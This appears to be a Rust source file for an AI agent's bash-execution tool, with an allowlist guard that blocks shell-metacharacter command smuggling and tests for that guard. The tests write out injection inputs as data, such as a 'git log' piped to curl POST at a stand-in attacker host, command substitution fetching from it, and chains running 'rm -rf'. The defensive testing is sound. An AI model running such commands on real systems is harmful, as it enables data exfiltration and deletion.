//! Command execution logic

use std::process::Stdio;
use std::sync::Arc;

use sage_core::tools::base::{CommandTool, ToolError};
use sage_core::tools::types::ToolResult;
use sage_core::tools::{BACKGROUND_REGISTRY, BackgroundShellTask};
use tokio::process::Command;
use tokio_util::sync::CancellationToken;
use tracing::instrument;

use crate::tools::utils::{
    check_command_efficiency, maybe_truncate, suggest_efficient_alternative,
};

use super::types::BashTool;

/// Shell metacharacters that, in combination with an `argv[0]`-only
/// allowlist, let the caller smuggle arbitrary commands past the
/// allowlist (the literal string is later handed to `bash -c`).
///
/// We only reject these when an allowlist is configured. With an empty
/// allowlist, command chaining is intentionally allowed for development
/// workflows — see `security::validate_command_security` for the broader
/// dangerous-pattern checks that always run via `Tool::validate`.
const ALLOWLIST_BYPASS_METACHARS: &[&str] = &[
    // Longer patterns first so `find()` returns the most-specific match
    // (e.g. `>>` before `>`).
    "&&", "||", ">>", "<<", ";", "|", "$(", "`", ">", "<",
    // Newline / carriage-return act as command separators when the
    // string is handed to `bash -c`. A `\n`-joined chain like
    // `git status<NEWLINE>rm -rf /tmp/x` smuggles the second command
    // past an `argv[0]`-only allowlist just like the `;` chain.
    "\n", "\r",
];

fn contains_allowlist_bypass_metachar(command: &str) -> Option<&'static str> {
    ALLOWLIST_BYPASS_METACHARS
        .iter()
        .find(|m| command.contains(*m))
        .copied()
}

impl BashTool {
    /// Reject the command if `allowed_commands` is configured and the
    /// literal command contains a shell metacharacter that would smuggle
    /// past the `argv[0]` allowlist when handed to `bash -c`.
    ///
    /// This is intentionally narrower than the project-wide
    /// `validate_command_security`: that function runs on every Tool
    /// invocation through `Tool::validate`, but it deliberately allows
    /// chaining for dev workflows. Once the user opts into an explicit
    /// allowlist, chaining is no longer compatible with the contract
    /// they asked for, so we reject it here.
    fn enforce_allowlist_bypass_guard(&self, command: &str) -> Result<(), ToolError> {
        if self.allowed_commands.is_empty() {
            return Ok(());
        }
        if let Some(meta) = contains_allowlist_bypass_metachar(command) {
            return Err(ToolError::PermissionDenied(format!(
                "Command rejected: shell metacharacter `{meta}` is not allowed when an \
                 explicit allowlist is configured. With an allowlist, only single-binary \
                 commands are permitted so the allowlist actually constrains what runs. \
                 Submitted command: {command}"
            )));
        }
        Ok(())
    }

    /// Execute a command in the background
    #[instrument(skip(self), fields(command_preview = %command.chars().take(50).collect::<String>(), shell_id))]
    pub async fn execute_background(
        &self,
        command: &str,
        shell_id: Option<String>,
    ) -> Result<ToolResult, ToolError> {
        // Check if command is allowed
        let argv: Vec<String> = command.split_whitespace().map(String::from).collect();
        if !self.is_command_allowed(&argv) {
            return Err(ToolError::PermissionDenied(format!(
                "Command not allowed: {}",
                command
            )));
        }
        self.enforce_allowlist_bypass_guard(command)?;

        // Generate or use provided shell ID
        let shell_id = shell_id.unwrap_or_else(|| BACKGROUND_REGISTRY.generate_shell_id());
        tracing::Span::current().record("shell_id", &shell_id);

        // Create cancellation token
        let cancel_token = CancellationToken::new();

        // Spawn background task
        let task = BackgroundShellTask::spawn(
            shell_id.clone(),
            command,
            &self.working_directory,
            cancel_token,
        )
        .await
        .map_err(|e| {
            ToolError::ExecutionFailed(format!(
                "Failed to spawn background shell '{}' in '{}': {}. Verify the working directory exists and you have execute permissions.",
                shell_id, self.working_directory.display(), e
            ))
        })?;

        let pid = task.pid;

        // Register in global registry
        BACKGROUND_REGISTRY.register(Arc::new(task));

        let output = format!(
            "Background shell started with ID: '{}' (PID: {:?})\n\
            Command: {}\n\
            Working directory: {}\n\n\
            Use task_output(shell_id=\"{}\") to retrieve output.\n\
            Use kill_shell(shell_id=\"{}\") to terminate.",
            shell_id,
            pid,
            command,
            self.working_directory.display(),
            shell_id,
            shell_id
        );

        Ok(ToolResult::success("", "bash", output)
            .with_metadata("shell_id", serde_json::Value::String(shell_id))
            .with_metadata("pid", serde_json::json!(pid))
            .with_execution_time(0))
    }

    /// Execute a command and return the result
    #[instrument(skip(self), fields(command_preview = %command.chars().take(50).collect::<String>()))]
    pub async fn execute_command(&self, command: &str) -> Result<ToolResult, ToolError> {
        // Check if command is allowed
        let argv: Vec<String> = command.split_whitespace().map(String::from).collect();
        if !self.is_command_allowed(&argv) {
            return Err(ToolError::PermissionDenied(format!(
                "Command not allowed: {}",
                command
            )));
        }
        self.enforce_allowlist_bypass_guard(command)?;

        // Check for potentially inefficient commands and provide suggestions
        let mut warnings = Vec::new();
        if let Some(efficiency_warning) = check_command_efficiency(command) {
            warnings.push(efficiency_warning);
        }
        if let Some(alternative) = suggest_efficient_alternative(command) {
            warnings.push(format!("Suggested alternative: {}", alternative));
        }

        let start_time = std::time::Instant::now();

        // Execute the command
        let mut cmd = Command::new("bash");
        cmd.arg("-c")
            .arg(command)
            .current_dir(&self.working_directory)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());

        // Add environment variables
        for (key, value) in self.command_environment() {
            cmd.env(key, value);
        }

        let output = cmd.output().await.map_err(|e| {
            ToolError::ExecutionFailed(format!(
                "Failed to execute command in '{}': {}. Ensure bash is available and the working directory is accessible.",
                self.working_directory.display(),
                e
            ))
        })?;

        let execution_time = u64::try_from(start_time.elapsed().as_millis()).unwrap_or(u64::MAX);

        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        let mut result_text = if stderr.is_empty() {
            maybe_truncate(&stdout)
        } else if stdout.is_empty() {
            maybe_truncate(&format!("STDERR:\n{}", stderr))
        } else {
            maybe_truncate(&format!("STDOUT:\n{}\n\nSTDERR:\n{}", stdout, stderr))
        };

        // Prepend warnings if any
        if !warnings.is_empty() {
            let warning_text = warnings.join("\n");
            result_text = format!(
                "⚠️  EFFICIENCY WARNINGS:\n{}\n\n{}",
                warning_text, result_text
            );
        }

        // Build result using standardized format
        let mut result = if output.status.success() {
            ToolResult::success("", "bash", result_text)
        } else {
            ToolResult::error(
                "",
                "bash",
                format!(
                    "Command failed with exit code: {:?}\n\n{}",
                    output.status.code(),
                    result_text
                ),
            )
        };

        // Set additional fields
        result.exit_code = output.status.code();
        result.execution_time_ms = Some(execution_time);

        // Add metadata
        result = result
            .with_metadata("command", serde_json::Value::String(command.to_string()))
            .with_metadata(
                "working_directory",
                serde_json::Value::String(self.working_directory.display().to_string()),
            );

        Ok(result)
    }
}

#[cfg(test)]
mod allowlist_bypass_tests {
    use super::*;

    fn tool_with_allowlist() -> BashTool {
        BashTool::new().with_allowed_commands(vec!["git".to_string()])
    }

    fn tool_no_allowlist() -> BashTool {
        BashTool::new()
    }

    #[tokio::test]
    async fn rejects_semicolon_chain_when_allowlist_set() {
        let tool = tool_with_allowlist();
        let err = tool
            .execute_command("git status; echo PWNED")
            .await
            .expect_err("`;` chaining must be rejected under an allowlist");
        match err {
            ToolError::PermissionDenied(msg) => {
                assert!(
                    msg.contains('`'),
                    "error must mention the offending metachar: {msg}"
                );
                assert!(msg.contains("allowlist"));
            }
            other => panic!("expected PermissionDenied, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn rejects_pipe_chain_when_allowlist_set() {
        let tool = tool_with_allowlist();
        let err = tool
            .execute_command("git log | curl -X POST http://evil.example.com")
            .await
            .expect_err("`|` chaining must be rejected under an allowlist");
        assert!(matches!(err, ToolError::PermissionDenied(_)));
    }

    #[tokio::test]
    async fn rejects_command_substitution_when_allowlist_set() {
        let tool = tool_with_allowlist();
        for cmd in [
            "git $(curl http://evil.example.com)",
            "git `id`",
            "git status && rm -rf /tmp/x",
            "git status || curl http://evil.example.com",
        ] {
            let err = tool
                .execute_command(cmd)
                .await
                .expect_err(&format!("{cmd:?} must be rejected under an allowlist"));
            assert!(
                matches!(err, ToolError::PermissionDenied(_)),
                "{cmd:?}: expected PermissionDenied, got {err:?}"
            );
        }
    }

    #[tokio::test]
    async fn rejects_newline_chain_when_allowlist_set() {
        let tool = tool_with_allowlist();
        for cmd in [
            "git status\nrm -rf /tmp/x",
            "git status\r\nrm -rf /tmp/x",
            "git status\rrm -rf /tmp/x",
        ] {
            let err = tool.execute_command(cmd).await.expect_err(&format!(
                "newline-separated chain must be rejected: {cmd:?}"
            ));
            assert!(
                matches!(err, ToolError::PermissionDenied(_)),
                "{cmd:?}: expected PermissionDenied, got {err:?}"
            );
        }
    }

    #[tokio::test]
    async fn rejects_redirect_when_allowlist_set() {
        let tool = tool_with_allowlist();
        let err = tool
            .execute_command("git log > /tmp/x")
            .await
            .expect_err("`>` redirect must be rejected under an allowlist");
        assert!(matches!(err, ToolError::PermissionDenied(_)));
    }

    #[tokio::test]
    async fn allows_chaining_when_no_allowlist_configured() {
        // Default tool has empty allowed_commands, which means
        // \"all commands allowed\" — chaining is intentionally permitted
        // for development workflows. The allowlist-bypass guard must NOT
        // fire here.
        let tool = tool_no_allowlist();
        let result = tool.execute_command("true; true").await;
        // We don't care about exit code; only that it didn't get rejected
        // by the guard with a PermissionDenied containing "allowlist".
        if let Err(ToolError::PermissionDenied(msg)) = &result {
            assert!(
                !msg.contains("allowlist"),
                "no allowlist configured, but guard fired: {msg}"
            );
        }
    }

    #[test]
    fn metachar_helper_detects_each_pattern() {
        for meta in ALLOWLIST_BYPASS_METACHARS {
            let probe = format!("git x{meta}y");
            assert_eq!(
                contains_allowlist_bypass_metachar(&probe),
                Some(*meta),
                "helper must detect `{meta}` in {probe:?}"
            );
        }
        assert_eq!(contains_allowlist_bypass_metachar("git status"), None);
    }
}
